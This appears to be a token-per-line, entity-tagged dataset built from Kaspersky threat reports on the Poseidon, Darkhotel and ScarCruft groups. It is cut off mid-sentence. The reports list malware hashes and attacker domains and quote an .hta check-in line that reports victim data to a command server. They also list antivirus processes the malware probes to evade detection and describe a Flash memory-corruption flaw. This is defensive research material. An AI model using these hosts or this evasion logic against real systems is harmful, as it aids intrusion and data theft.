few
of
these
still
had
active
infections
attempting
to
report
to
the
C&Cs
.

This
adds
an
interesting
dimension
to
the
story
.

As
part
of
Kaspersky
Lab's
commitment
to
securing
cyberspace
for
everyone
,
we
reached
out
and
notified
identifiable
victims
,
regardless
of
their
security
solution
and
provided
them
with
indicators
of
compromise
(
IOCs
)
to
help
root
out
the
active
infection
.

In
the
process
,
we
were
able
to
confirm
the
previously
described
operating
procedures
for
the
Poseidon B_malware.infosteal
Group
.

Is
this
a
state­sponsored
attack
?
Who
is
responsible
?

We
do
not
believe
this
to
be
a
state­sponsored
attack
but
rather
a
commercial
threat
player
.

Collaboration
with
information­sharing
partners
and
victim
institutions
allowed
us
to
become
aware
of
the
more
complicated
business
cycle
involved
in
this
story
,
greatly
adding
to
our
research
interest
in
tracking
these
campaigns
.

The
malware
is
designed
to
function
specifically
on
English
and
Portuguese­language
systems
.

This
is
the
first
ever
Portuguese­speaking
targeted
attack
campaign
.

How
long
have
the
attackers
been
active
?

The
attackers
have
been
active
for
more
than
ten
years
.

The
main
distribution
of
samples
goes
back
to
2005
with
possible
earlier
outliers
.

Operating
systems
such
as
Windows
95
for
desktop
computers
and
Windows
NT
for
server
editions
were
not
uncommon
at
the
time
and
Poseidon's B_malware.infosteal
team
has
evolved
gradually
into
targeting
the
latest
flagship
editions
of
Microsoft's
operating
systems
.

Recent
samples
show
interest
in
Windows
2012

Server
and
Windows
8.1
.

Did
the
attackers
use
any
interesting
/
advanced
technologies
?

During
a
particular
campaign
,
conventional
Poseidon B_malware.infosteal
samples
were
directed
to
IPs
resolving
to
satellite
uplinks
.

The
networks
abused
were
designed
for
internet
communications
with
ships
at
sea
which
span
a
greater
geographical
area
at
nearly
global
scale
,
while
providing
nearly
no
security
for
their
downlinks
.

The
malware
authors
also
possess
an
interesting
understanding
of
execution
policies
which
they
leverage
to
manipulate
their
victim
systems
.

They
combine
reconnaissance
of
GPO
(
Group
Policy
Object
management
for
execution
)
with
digitally­signed
malware
to
avoid
detection
or
blocking
during
their
infection
phases
.

These
digital
certificates
are
often
issued
in
the
name
of
rogue
and
legitimate
companies
to
avoid
arousing
suspicion
from
researchers
and
incident
responders
.

Does
Kaspersky
Lab
detect
all
variants
of
this
malware
?

Yes
,
all
samples
are
detected
by
signatures
and
also
heuristics
.

With
a
fully
updated
Kaspersky
Lab
anti­malware
solution
,
all
customers
are
protected
now
.

Kaspersky
Lab
products
detect
the
malware
used
by
Poseidon B_malware.infosteal
Group
with
the
following
detection
names
:

Backdoor.Win32.Nhopro

HEUR:Backdoor.Win32.Nhopro.gen

HEUR:Hacktool.Win32.Nhopro.gen

How
many
victims
have
you
found
?

At
least
35
victim
companies
have
been
identified
with
primary
targets
including
financial
and
government
institutions
,
telecommunications
,
manufacturing
,
energy
and
other
service
utility
companies
,
as
well
as
media
and
public
relations
firms
.

The
archaeological
effort
of
understanding
such
a
long­standing
group
can
severely
complicate
victim
identification
.

We
see
traces
of
upwards
of
a
few
tens
of
companies
targeted
.

The
exact
number
of
the
victims
may
actually
vary
.

Since
it
is
a
very
long
term
group
,
some
victims
may
be
impossible
to
identify
now
.

At
this
time
,
we
are
reaching
out
to
victims
of
active
infections
to
offer
remediation
assistance
,
IOCs
,
and
our
full
intelligence
report
to
help
them
counteract
this
threat
.

Any
victims
or
potential
targets
concerned
about
this
threat
should
please
contact
us
at
intelreports@kaspersky.com
.

Who
is
behind
these
attacks
?

We
do
not
speculate
on
attribution
.

Language
code
used
to
compile
implants
,
as
well
as
the
language
used
to
describe
certain
commands
used
by
the
group
,
actually
corresponds
to
Portuguese
from
Brazil
.

The
inclusion
of
Portuguese
language
strings
and
preference
for
Portuguese
systems
is
prominent
throughout
the
samples
.

The
tasking
of
Poseidon's B_malware.infosteal
campaigns
appears
to
be
heavily
focused
on
espionage
for
commercial
interests
.

Speculating
further
would
be
unsubstantiated
.

Reference
samples
hashes
:
2ce818518ca5fd03cbacb26173aa60ce B_hash
f3499a9d9ce3de5dc10de3d7831d0938 B_hash
0a870c900e6db25a0e0a65b8545656d4 B_hash
2fd8bb121a048e7c9e29040f9a9a6eee B_hash
4cc1b23daaaac6bf94f99f309854ea10 B_hash
2c4aeacd3f7b587c599c2c4b5c1475da B_hash
f821eb4be9840feaf77983eb7d55e5f6 B_hash
2ce818518ca5fd03cbacb26173aa60ce B_hash

Command
and
control
servers
:
akamaihub[.]com B_url.unknown
–
SINKHOLED
by
Kaspersky
Lab
igdata[.]net B_url.unknown
–
SINKHOLED
by
Kaspersky
Lab
mozillacdn[.]com B_url.unknown
–
SINKHOLED
by
Kaspersky
Lab
msupdatecdn[.]com B_url.unknown
–
SINKHOLED
by
Kaspersky
Lab
sslverification[.]net B_url.unknown
–
SINKHOLED
by
Kaspersky
Lab

For
more
about
counter
Poseidon B_malware.infosteal
and
similar
attacks
,
read
this
article
in
the
Kaspersky

Business
Blog
.
Darkhotel's B_malware.infosteal
attacks I
in
2015
10
août
2015

Darkhotel B_malware.infosteal
APT I
attacks I
dated
2014
and
earlier
are
characterized
by
the
misuse
of
stolen
certificates
,
the
deployment
of
.hta
files
with
multiple
techniques
,
and
the
use
of
unusual
methods
like
the
infiltration
of
hotel
Wi-Fi
to
place
backdoors
in
targets
'
systems
.

In
2015
,
many
of
these
techniques
and
activities
remain
in
use
.

However
,
in
addition
to
new
variants
of
malicious
.hta
,
we
find
new
victims
,
.rar
attachments
with
RTLO
spearphishing
,
and
the
deployment
of
a
0day
from
Hacking
Team
.

The
Darkhotel B_malware.infosteal
APT I
continues
to
spearphish
targets
around
the
world
,
with
a
wider
geographic
reach
than
its
previous
botnet
buildout
and
hotel
Wi-Fi
attacks
.

Some
of
the
targets
are
diplomatic
or
have
strategic
commercial
interests
.

The
location
of
Darkhotel's B_malware.infosteal
targets
and
victims
in
2015
:
●
North
Korea
●
Russia
●
South
Korea
●
Japan
●
Bangladesh
●
Thailand
●
Mozambique
●
Germany

India
2015
Darkhotel B_malware.infosteal
.hta
and
backdoor-related
,
exploit-related
and
c2
sites
:
tisone360[.]org B_url.distribute
●
storyonboard[.]net B_url.distribute
●
openofficev[.]info B_url.distribute
●
saytargetworld[.]net B_url.distribute
●
error-page[.]net B_url.distribute
●
eonlineworld[.]net B_url.distribute
●
enewsbank[.]net B_url.distribute
thewordusrapid[.]com B_url.distribute
2015
spearphishing
incident
attachment
name
subset
:
●
schedule(6.1~6).rar
->
schedule(6.1~6)_?gpj.scr
●
schedule(2.11~16).rar
->
schedule(2.11~16)_?gpj.scr
●
congratulation.rar
->
congratulation_?gpj.scr
letter.rar
->
letter_?gpj.scr

Consistent
use
of
obfuscated
.hta
downloaders

Whether
the
infection
is
achieved
through
spearphishing
,
physical
access
to
a
system
or
the
Hacking
Team
Flash
0day
,
there
frequently
seems
to
be
a
common
method
for
a
newly-infected
system
to
communicate
with
Darkhotel's B_malware.infosteal
c2
:

A
lightly
obfuscated
(
double
escaped
set
of
javascript
variable
values
)
script
maintained
within
an
.hta
file
writes
an
executable
to
disk
and
executes
it
.

It
is
interesting
that
this
particular
group
has
for
years
now
deployed
backdoor
and
downloader
code
in
the
form
of
.hta
files
.

In
2010
,
we
observed
it
re-purposing
articles
on
North
Korea
by
the
US
think
-
tank
,

Brookings
Institute
,
in
order
to
attack
North
Korean-related
targets
with
malicious
code
buried
in
.hta
files
.

It
also
emailed
links
to
its
malicious
.hta
files
to
North
Korean
tourist
groups
,
economists
with
an
interest
in
North
Korea
,
and
more
.

It's
somewhat
strange
to
see
such
heavy
reliance
on
older
Windows
-
specific
technology
like
HTML
applications
,
introduced
by
Microsoft
in
1999
.

From
the
recent
sendspace.servermsys.com/downloader.hta
:

After
execution
and
escaping
a
couple
of
variables
,
the
.hta
uses
ancient
Adodb.stream
components
in
order
to
write
out
a
string
xor'd
with
0x3d
as
an
executable
file
and
runs
it
.

This
'
internet_explorer_Smart_recovery.exe
'
054471f7e168e016c565412227acfe7f
,
and
a
hidden
browser
window
phoning
back
to
its
c2
.

In
this
case
,
execution
code
results
it
seems
that
Darkhotel B_malware.infosteal
operators
are
checking
as
to
whether
or
not
the
victim's
default
browser
is
Internet
Explorer
,
as
all
versions
of
IE
return
the
value
'
0
'
and
other
browsers
leave
'
appMinorVersion
'
undefined
.

This
data
collection
seems
somewhat
odd
,
because
.hta
files
are
supported
and
run
by
mshta.exe
on
Windows
systems
only
,
still
delivered
with
Windows
8
.

Perhaps
it
is
an
artefact
from
early
development
of
the
code
.

Here
is
a
recent
version
:
'
hxxp://sendspace.servermsys.com/readme.php?type=execution&result=created_and_executed&info=
'
+
navigator.appMinorVersion
+
'

The
'
internet_explorer_Smart_recovery.exe
'
file
is
a
simple
obfuscated
downloader
.

A
series
of
xor
0x28
loops
decrypt
the
contents
of
a
self-deletion
batch
file
,
which
is
then
written
to
disk
and
executed
.
Later
in
the
execution
,
a
more
complex
rc4
loop
decrypts
the
download
url
and
other
strings
and
imports
.

When
finished
,
this
url
string
decryption
and
connectback
looks
like
downloaded
http://sendspace.servermsys.com/wnctprx B_url.normal
.

(
b1f56a54309147b07dda54623fecbb89
)
to
'
.tmp
'
file
in
%temp%
,
executed
,
and
the
downloader
exits
.

This
larger
file
is
a
backdoor
/
downloader
that
includes
ssh
functionality
,
and
drops
its
keys
to
disk
for
ssh
interaction
.

We
find
older
Darkhotel B_malware.infosteal
information
stealers
dropped
and
run
on
the
system
by
these
downloaders
.

Spearphishing
and
.rar
Attachments
with
RTLO

The
Darkhotel B_malware.infosteal
APT I
will
relentlessly
spearphish
specific
targets
in
order
to
successfully
compromise
systems
.

Some
targets
are
spearphished
repeatedly
with
much
the
same
social-engineering
schemes
.

For
example
,
the
attachment
'
schedule(2.11~16).rar
'
could
be
sent
on

February
10th
,
with
Darkhotel B_malware.infosteal
returning
to
the
same
targets
in
late
May
for
a
second
attempt
with
attachment
'
schedule(6.1~6).rar
'
.

It
consistently
archives
RTLO
.scr
executable
files
within
.rar
archives
,
in
order
to
appear
to
the
target
as
innocuous
.jpg
files
.

These
executable
files
are
lite
droppers
,
maintaining
these
decoy
jpeg
files
,
and
code
to
create
an
lnk
downloader
.

When
the
target
attempts
to
open
what
they
think
is
a
jpg
image
file
,
the
executable
code
runs
and
drops
a
jpg
image
to
disk
,
then
opens
it
with
mspaint.exe
in
the
background
.

This
'
congratulations
'
document
is
in
Korean
,
revealing
a
likely
characteristic
of
the
intended
target
.

While
the
image
is
displayed
,
the
code
drops
an
unusual
mspaint.lnk
shortcut
to
disk
and
launches
it
.

The
shortcut
maintains
a
multiline
target
shell
script
.

This
technique
is
also
used
by
other
APTs
as
persistence
mechanisms
,
as
documented
by
our
Mandiant
colleagues
.

The
64kb
lnk
file
is
downloader
code
:

When
this
lnk
file
is
executed
,
it
begins
an
AJAX-based
download
process
for
the
'
unzip.js
'
file
(
a07124b65a76ee7d721d746fd8047066
)
on
openofficev.info
.

This
is
another
wscript
file
implementing

AJAX
to
download
and
execute
a
relatively
large
compiled
executable
:

This
executable
code
is
saved
to
%temp%\csrtsrm.exe
and
executed
there
.

It
is
a
relatively
large
executable
(
~1.2
mb
)
that
injects
malicious
code
and
spawns
remote
threads
into
legitimate
processes
.

Stolen
certificates
and
evasion

The
group
appears
to
maintain
a
stockpile
of
stolen
certificates
and
deploys
their
downloaders
and
the
backdoors
signed
with
them
.

Some
of
the
more
recent
revoked
certificates
include
ones
that
belong
to
Xuchang
Hongguang
Technology
Co
.
Ltd
.

Darkhotel B_malware.infosteal
now
tends
to
hide
its
code
behind
layers
of
encryption
.

It
is
likely
that
it
has
slowly
adapted
to
attacking
better
-
defended
environments
and
prefers
not
to
burn
these
stolen
digital
certificates
.

In
previous
attacks
it
would
simply
have
taken
advantage
of
a
long
list
of
weakly
implemented
,
broken
certificates
.

Not
only
are
its
obfuscation
techniques
becoming
stronger
,
but
its
anti-detection
technology
list
is
growing
.

For
example
,
this
signed
downloader
(
d896ebfc819741e0a97c651de1d15fec
)
decrypts
a
set
of
anti-malware
strings
in
stages
to
identify
defensive
technologies
on
a
newly-infected
system
,
and
then
opens
each
process
,
looking
for
a
matching
image
name
:
c:\avast
!
sandbox\WINDOWS\system32\kernel32.dll
-
Avast
!
avp.exe
-
Kaspersky
Lab
mcagent.exe;mcuicnt.exe
-
Intel/Mcafee
bdagent.exe
-
BitDefender
ravmon.exe,ravmond.exe
-
Beijing
Rising
360tray.exe,360sd.exe,360rp.exe,exeMgr.exe
-
Qihoo
360
ayagent.aye,avguard.;avgntsd.exe
-
Avira
Antivirus
ccsvchst.exe,nis.exe
-
Symantec
Norton
avgui.exe,avgidsagent.exe,avastui.exe,avastsvc.exe
-
Avast
!
msseces.exe;msmpeng.exe
-
Microsoft
Security
Essentials
and
Microsoft
Anti-Malware
Service

AVK.exe;AVKTray.exe
-
G-Data
avas.exe
-
TrustPort
AV
tptray.exe
-
Toshiba
utility
fsma32.exe;fsorsp.exe
-
F-Secure
econser.exe;escanmon.exe
-
Microworld
Technologies
eScan

SrvLoad.exe;PSHost.exe
-
Panda
Software
egui.exe;ekrn.exe
-
ESET
Smart
Security
pctsSvc.exe;pctsGui.exe
-
PC
Tools
Spyware
Doctor
casc.exe;UmxEngine.exe
-
CA
Security
Center
cmdagent.exe;cfp.exe
-
Comodo

KVSrvXP.exe;KVMonXP.exe
-
Jiangmin
Antivirus
nsesvc.exe;CClaw.exe
-
Norman

V3Svc.exe
-
Ahnlab
guardxup
.
-
IKARUS

FProtTray
.
-
F-Prot
op_mon
-
Agnitum
Outpost
vba332ldr.;dwengine
.
-
DrWeb

Even
the
identifying
information
that
the
backdoor
seeks
from
a
system
is
not
decrypted
until
runtime
.

Like
the
'
information-stealer
'
component
documented
in
our
previous
Darkhotel B_malware.infosteal
technical
report
,
this
component
seeks
to
steal
a
set
of
data
with
which
to
identify
the
infected
system
.

Much
of
i.e.
kernel32.GetDefaultSystemLangID
,
kernel32.GetVersion
,
and
kernel32.GetSystemInfo
:
collected
with
set
of
same
calls
,
information
●
Default
system
codepage
●
Network
adapter
information
●
Processor
architecture
●
Hostname
and
IP
address
●
Windows
OS
and
Service
Pack
versions

Essentially
,
much
of
this
information-stealer
code
is
the
same
as
that
observed
in
previous
attacks
.

Tisone360.com
,
Visits
,
and
Hacking
Team
Flash
0day

The
tisone360.com
site
was
especially
interesting
to
us
.

In
April
2015
,
Darkhotel B_malware.infosteal
was
email-phishing
with
links
to
earlier
(
cve-2014
)
Flash
exploits
,
and
then
,
at
the
beginning
of
July
,
it
began
to
distribute
what
is
reported
to
be
a
leaked
Hacking
Team
Flash
0day
.

It
looks
like
the
Darkhotel B_malware.infosteal
APT
may
have
been
using
the
leaked
HackingTeam
Flash
0day
to
target
specific
systems
.

We
can
pivot
from
'
tisone360.com
'
to
identify
some
of
this
activity
.

The
site
was
up
and
active
as
late
as
22
July
,
2015
.

However
,
this
looks
to
be
a
small
part
of
its
activity
.

In
addition
to
the
icon.swf
HT
0day
(
214709aa7c5e4e8b60759a175737bb2b
)
,
it
looks
as
though
the
'
tisone360.com
'
site
was
delivering
a
Flash
CVE-2014-0497
exploit
in
April
.

We
reported
the
related
vulnerability
to
Adobe
in
January
2014
,
when
it
was
being
used
by
the
Darkhotel B_malware.infosteal
APT
.

Recently
,
the
Darkhotel B_malware.infosteal
APT
has
maintained
multiple
working
directories
on
this
site
.

It
is
the
ims2
directory
that
is
the
most
active
.

It
contains
a
set
of
backdoors
and
exploits
.

The
most
interesting
of
these
is
the
reported
Hacking
Team
Flash
0day
,
icon.swf
.

In
the
days
following
the
public
mention
of
this
server
,
the
crew
slowly
tightened
down
open
access
to
/ims2/
.
Either
way
,
the
contents
continued
to
be
actively
used
.

icon.swf
(
214709aa7c5e4e8b60759a175737bb2b
)
->
icon.jpg
(
42a837c4433ae6bd7490baec8aeb5091
)
->
%temp%\RealTemp.exe
(
61cc019c3141281073181c4ef1f4e524
)

After
icon.jpg
is
downloaded
by
the
flash
exploit
,
it
is
decoded
with
a
multibyte
xor
key
0xb369195a02
.

It
then
downloads
further
components
.

It's
interesting
to
note
that
the
group
appears
to
be
altering
the
compilation
and
linker
timestamps
of
its
executable
code
to
dates
in
2013
.

We
see
this
across
multiple
samples
deployed
and
observed
for
the
first
time
in
mid-2015
,
including
the
icon.jpg
downloader
.

A
log
of
visits
to
the
site
directory
records
that
the
directory
was
set
up
on
July
8th
.

A
handful
of
visits
to
a
specific
url
on
the
server
from
five
systems
based
in
the
following
locations
were
recorded
on
the
8th
and
9th
.

Several
of
these
are
likely
to
be
Darkhotel B_malware.infosteal
APT I
targets
:
●
Germany
●
South
Korea
●
China
(
likely
to
be
research
)
●
US
●
Japan

However
,
one
of
those
systems
hammered
the
site
on
the
9th
,
visiting
almost
12,000
times
in
30
minutes
.

This
volume
of
traffic
is
likely
to
represent
a
noisy
scanning
research
attempt
and
not
someone
DoS'ing
the
site
:

Recorded
site
visits
following
the
9th
are
likely
to
be
unreliable
and
may
be
more
researchers
,
responding
to
the
growing
notoriety
of
the
site
following
the
public
reports
on
the
9th
.

Many
of
these
approximately
50
visits
come
from
a
subset
of
the
above
systems
and
are
repeated
multiple
times
.

Visits
from
the
following
locations
occurred
on
or
after
the
10th
:
●
Germany
(
likely
to
be
research
)
●
Ukraine
(
likely
to
be
research
)
●
Amazon
Web
Services
,
multiple
locations
(
likely
to
be
research
)
●
Googlebot
,
multiple
locations
●
US
●
Russia
●
Brazil
●
China

Ireland
(
likely
to
be
research
)
●
Finland
●
Canada
●
Taiwan
●
France
(
likely
to
be
research
)
●
Czech
Republic

A
consistent
attack
flow

The
Darkhotel B_malware.infosteal
group
tends
to
stick
with
what
works
.

For
example
,
for
years
we
saw
repeated
use
of
spearphishing
targets
directly
with
.hta
files
.

Now
,
as
with
the
tisone360.com
site
above
,
we
have
seen
repeated
use
in
2015
of
a
creative
chain
of
delivery
sets
.

downloader
->
hta
checkin
->
info
stealer
->
more
compiled
components
.

dropper
->
wsh
script
->
wsh
script
->
info
stealer
->
more
compiled
components
spearphish
->
dropper
->
hta
checkin
->
downloader
->
info
stealer

While
a
chain
of
delivery
that
includes
obfuscated
scripts
within
.hta
files
occurred
as
far
back
as
2011
,
the
volume
appears
to
have
picked
up
in
2014
and
now
2015
.

openofficev[.]info
(
2015
)
office-revision[.]com
(
2014
)
online.newssupply[.]net
(
2011
)

Hiding
infrastructure
in
plain
sight

The
group
is
now
more
vigilant
in
maintaining
its
sites
,
tightening
up
configuration
and
response
content
.

Right
now
,
its
c2
responds
with
anti-hero
images
of
'
Drinky
Crow
'
from
the
alt
Maakies
cartoon
:

Other
Darkhotel B_malware.infosteal
c2s
tend
to
blend
in
with
random
sites
on
the
web
when
incorrect
or
missing
pages
are
visited
.

They
are
ripping
images
either
from
FOTOLIA
or
articles
on
artisanal
ice
cream
makers
here
:

HTA
md5
:
021685613fb739dec7303247212c3b09 B_hash
1ee3dfce97ab318b416c1ba7463ee405 B_hash
2899f4099c76232d6362fd62ab730741 B_hash
2dee887b20a06b8e556e878c62e46e13 B_hash
6b9e9b2dc97ff0b26a8a61ba95ca8ff6 B_hash
852a9411a949add69386a72805c8cb05 B_hash
be59994b5008a0be48934a9c5771dfa5 B_hash
e29693ce15acd552f1a0435e2d31d6df B_hash
fa67142728e40a2a4e97ccc6db919f2b B_hash
fef8fda27deb3e950ba1a71968ec7466 B_hash

Spearphish
attachments
md5
:
5c74db6f755555ea99b51e1c68e796f9 B_hash
c3ae70b3012cc9b5c9ceb060a251715a B_hash
560d68c31980c26d2adab7406b61c651 B_hash
da0717899e3ccc1ba0e8d32774566219 B_hash
d965a5b3548047da27b503029440e77f B_hash
dc0de14d9d36d13a6c8a34b2c583e70a B_hash
39562e410bc3fb5a30aca8162b20bdd0 B_hash
(
first
seen
late
2014
,
used
into
2015
)
e85e0365b6f77cc2e9862f987b152a89 B_hash
(
first
seen
late
2014
,
used
into
2015
)
2015
large
downloader
md5
:
5e01b8bc78afc6ecb3376c06cbceb680 B_hash
61cc019c3141281073181c4ef1f4e524 B_hash
3d2e941ac48ae9d79380ca0f133f4a49 B_hash
fc78b15507e920b3ee405f843f48a7b3 B_hash
da360e94e60267dce08e6d47fc1fcecc B_hash
33e278c5ba6bf1a545d45e17f7582512 B_hash
b1f56a54309147b07dda54623fecbb89 B_hash
009d85773d519a9a97129102d8116305 B_hash

Infostealers
dropped
in
2015
61637a0637fb25c53f396c305efa5dc5 B_hash
a7e78fd4bf305509c2fc1b3706567acd B_hash

Subhosts
and
urls
:
tisone360.com/img_h/ims2/icon.swf B_url.normal
tisone360.com/img_h/ims2/1.php B_url.normal
tisone360.com/img_h/ims2/icon.jpg B_url.normal
tisone360.com/noname/img/movie.swf B_url.normal
tisone360.com/noname/minky/face.php B_url.normal
tisone360.com/htdoc/ImageView.hta B_url.normal
tisone360.com/htdoc/page1/page.html B_url.normal
daily.enewsbank.net/wmpsrx64 B_url.normal
daily.enewsbank.net/newsviewer.hta B_url.normal
saytargetworld.net/season/nextpage.php B_url.normal
sendspace.servermsys.com/wnctprx B_url.normal
error-page.net/update/load.php B_url.normal
photo.storyonboard.net/wmpsrx64 B_url.normal
photo.storyonboard.net/photoviewer.hta B_url.normal
photo.storyonboard.net/readme.php B_url.normal
unionnewsreport.net/aeroflot_bonus/ticket.php B_url.normal
www.openofficev.info/xopen88/office2 B_url.normal
www.openofficev.info/dec98/unzip.js B_url.normal
www.openofficev.info/open99/office32 B_url.normal
www.openofficev.info/decod9/unzip.js B_url.normal

Parallel
and
Previous
Research

CVE-2014-0497
–
A
0-day
Vulnerability
https://securelist.com/blog/incidents/58244/cve-2014-0497-a-0-day-vulnerability/ B_url.normal

Hacking
Team
Flash
Zero-Day
Tied
To
Attacks
In
Korea
and
Japan
...
on
July
1
http://blog.trendmicro.com/trendlabs-security-intelligence/hacking-team-flash-zero-day-tied-to-attacks-inkorea-and-japan-on-july-1/ B_url.normal

The
Darkhotel B_malware.infosteal
APT I
https://securelist.com/blog/research/66779/the-Darkhotel-apt/ B_url.normal

À
propos
de
Kaspersky
Lab

Kaspersky
Lab
est
la
première
entreprise
privée
de
cyber-sécurité
au
niveau
mondial
et
l'une
de
celles
enregistrant
la
croissance
la
plus
rapide
.

Depuis
sa
création
en
1997
,
Kaspersky
Lab
n'a
cessé
d'innover
et
de
faire
évoluer
la
cyber-sécurité
.

L'entreprise
offre
des
solutions
de
sécurité
digitale
et
des
services
d'intelligence
pensés
pour
les
consommateurs
,
les
PME
et
les
grandes
entreprises
.

Présente
dans
près
de
200
pays
,
protégeant
plus
de
400
millions
d'utilisateurs
dans
le
monde
,
la
société
est
reconnue
comme
l'un
des
quatre
premiers
fournisseurs
mondiaux
de
solutions
Endpoint
pour
utilisateurs
finaux
(
IDC
,
2014
)
.

Pour
en
savoir
plus
:
www.kaspersky.fr B_url.normal

Pour
en
savoir
plus
:
www.kaspersky.com/fr/ B_url.normal

Pour
plus
d'informations
sur
l'actualité
virale
:
http://www.securelist.com B_url.normal

Salle
de
presse
virtuelle
Kaspersky
Lab
:
http://newsroom.kaspersky.eu/fr/ B_url.normal

Blog
français
de
Kaspersky
Lab
:
http://blog.kaspersky.fr/ B_url.normal

Hotwire
pour
Kaspersky
Lab

Marion
Delmas
/
Eric
Le
Yavanc
/
Marion
Larivière
01
43
12
55
62
/
47
/
64

KasperskyFrance@hotwirepr.com
Flash
zero-day B_malware.backdoor
exploit
deployed
by
the
ScarCruft B_malware.infosteal
APT I
Group
securelist.com/blog/research/75100/operation-daybreak/

Earlier
this
year
,
we
deployed
new
technologies
in
Kaspersky
Lab
products
to
identify
and
block
zero-day B_malware.backdoor
attacks
.

This
technology
already
proved
its
effectiveness
earlier
this
year
,
when
it
caught
an
Adobe
Flash
zero
day
exploit
(
CVE-2016-1010
)
.

Earlier
this
month
,
our
technology
caught
another
zero-day B_malware.backdoor
Adobe
Flash
Player
exploit
deployed
in
targeted
attacks
.

We
believe
the
attacks
are
launched
by
an
APT
Group
we
track
under
the
codename
'
ScarCruft B_malware.infosteal
'
.

ScarCruft B_malware.infosteal
is
a
relatively
new
APT
group
;
victims
have
been
observed
in
Russia
,
Nepal
,
South
Korea
,
China
,
India
,
Kuwait
and
Romania
.

The
group
has
several
ongoing
operations
,
utilizing
multiple
exploits
—
two
for
Adobe
Flash
and
one
for
Microsoft
Internet
Explorer
.

Operation B_malware.infosteal
Daybreak I
appears
to
have
been
launched
by
ScarCruft B_malware.infosteal
in
March
2016
and
employs
a
previously
unknown
(
0-day B_malware.backdoor
)
Adobe
Flash
Player
exploit
.

It
is
also
possible
that
the
group
deployed
another
zero B_malware.backdoor
day I
exploit I
,
CVE-2016-0147
,
which
was
patched
in
April
.

This
exploit
caught
by
our
technologies
highlights
a
few
very
interesting
evasion
methods
,
some
of
which
we
haven't
seen
before
.

We
describe
them
below
.

Operation B_malware.infosteal
Daybreak I
general
information

Operation B_malware.infosteal
Daybreak I
appears
to
have
been
launched
by
unknown
attackers
to
infect
high
profile
targets
through
spear B_malware.infosteal
- I
phishing I
e-mails
.

To
date
,
we
have
observed
more
than
two
dozen
victims
for
these
attacks
.

Although
the
exact
attack
vector
remains
unknown
,
the
targets
appear
to
receive
a
malicious
link
which
points
to
a
hacked
website
where
the
exploitation
kit
is
hosted
.

The
hacked
web
server
hosting
the
exploit
kit
is
associated
with
the
ScarCruft B_malware.infosteal
APT I
and
used
in
another
line
of
attacks
.

Certain
details
,
such
as
using
the
same
infrastructure
and
targeting
,
make
us
believe
that
Operation B_malware.infosteal
Daybreak I
is
being
done
by
the
ScarCruft B_malware.infosteal
APT I
group I
.

The
ScarCruft B_malware.infosteal
APT I
group I
is
a
relatively
new
player
and
managed
to
stay
under
the
radar
for
some
time
.

In
general
,
their
work
is
very
professional
and
focused
.

Their
tools
and
techniques
are
well
above
the
average
.

Prior
to
the
discovery
of
Operation B_malware.infosteal
Daybreak I
,
we
observed
the
ScarCruft B_malware.infosteal
APT
launching
a
series
of
attacks
in
Operation B_malware.backdoor
Erebus I
.

Operation B_malware.backdoor
Erebus I
leverages
another
Flash
Player
exploit
(
CVE-2016-4117
)
through
the
use
of
watering B_malware.backdoor
hole I
attacks
.

In
the
case
of
Operation B_malware.infosteal
Daybreak I
,
the
hacked
website
hosting
the
exploit
kit
performs
a
couple
of
browser
checks
before
redirecting
the
visitor
to
a
server
controlled
by
the
attackers
hosted
in
Poland
.

The
main
exploit
page
script
contains
a
BASE64
decoder
,
as
well
as
rc4
decryption
implemented
in
JS
.

The
parameters
sent
to
the
'
ap.php
'
script
are
randomly
generated
on
each
hit
,
so
the
second
stage
payload
gets
encrypted
differently
each
time
.

This
prevents
easy
detection
by
MD5
or
signatures
of
the
second
stage
payload
.

The
exploitation
process
consists
of
three
Flash
objects
.

The
Flash
object
that
triggers
the
vulnerability
in
Adobe
Flash
Player
is
located
in
second
SWF
delivered
to
the
victim
.

At
the
end
of
the
exploitation
chain
,
the
server
sends
a
legitimate
PDF
file
to
user
–
'
china.pdf
'
.

The
'
china.pdf
'
file
shown
to
the
victims
in
the
last
stage
of
the
attack
seems
to
be
written
in
Korean
:

Decoy
document
shown
to
victims

The
document
text
talks
about
disagreements
between
China
and
'
The
North
'
over
nuclear
programs
and
demilitarization
.

Vulnerability
technical
details

The
vulnerability
(
CVE-2016-4171
)
is
located
in
the
code
which
parses
the
ExecPolicy
metadata
information
.

This
is
what
the
structure
looks
like
:

This
structure
also
contains
an
array
of
item_info
structures
:

The
documentation
says
the
following
about
these
structures
:

'
The
item_info
entry
consists
of
item_count
elements
that
are
interpreted
as
key
/
value
pairs
of
indices
into
the
string
table
of
the
constant
pool
.

If
the
value
of
key
is
zero
,
this
is
a
keyless
entry
and
only
carries
a
value
.
'

In
the
exploit
used
by
the
ScarCruft B_malware.infosteal
group
,
we
have
the
following
item_info
structures
:

Item_info
array
in
exploit
object

The
code
that
triggers
the
vulnerability
parses
this
structure
and
,
for
every
key
and
value
members
,
tries
to
get
the
respective
string
object
from
string
constant
pool
.

The
problem
relies
on
the
fact
that
the
'
.key
'
and
'
.value
'
members
are
used
as
indexes
without
any
kind
of
boundary
checks
.

It
is
easy
to
understand
that
if
key
or
value
members
are
larger
than
string
constant
pool
array
,
a
memory
corruption
problem
appears
.

It
is
also
important
to
mention
that
this
member's
(
value
,
key
)
are
directly
read
from
SWF
object
,
so
an
attacker
can
easily
use
them
to
implement
arbitrary
read
/
write
operations
.

Getting
object
by
index
from
constant
pool
without
any
checks

Using
this
vulnerability
,
the
exploit
implements
a
series
of
writes
at
specified
addresses
to
achieve
full
remote
code
execution
.

Bypassing
security
solutions
through
DDE

The
Operation B_malware.infosteal
Daybreak I
attack
employs
multiple
stages
,
which
are
all
outstanding
in
some
way
.

One
of
them
attracted
our
attention
because
it
implements
a
bypass
for
security
solutions
we
have
never
seen
before
.

In
the
first
stage
of
the
attack
,
the
decrypted
shellcode
executed
by
the
exploit
downloads
and
executes
a
special
DLL
file
.

This
is
internally
called
'
yay_release.dll
'
:

Second
stage
DLL
internal
name
and
export

The
code
of
this
module
is
loaded
directly
into
the
exploited
application
and
has
several
methods
of
payload
execution
.

One
of
method
uses
a
very
interesting
technique
of
payload
execution
which
is
designed
mostly
to
bypass
modern
anti-malware
products
.

This
uses
an
interesting
bug
in
the
Windows
DDE
component
.

It
is
not
a
secret
that
anti-malware
systems
trigger
on
special
system
functions
that
are
called
in
the
context
of
potential
vulnerable
applications
to
make
a
deeper
analysis
of
API
calls
such
as
CreateProcess
,
WinExec
or
ShellExecute
.

For
instance
,
such
defense
technologies
trigger
if
a
potentially
vulnerable
application
such
as
Adobe
Flash
starts
other
untrusted
applications
,
scripts
interpreters
or
even
the
command
console
.

To
make
execution
of
payload
invisible
for
these
defense
systems
,
the
threat
actors
used
the
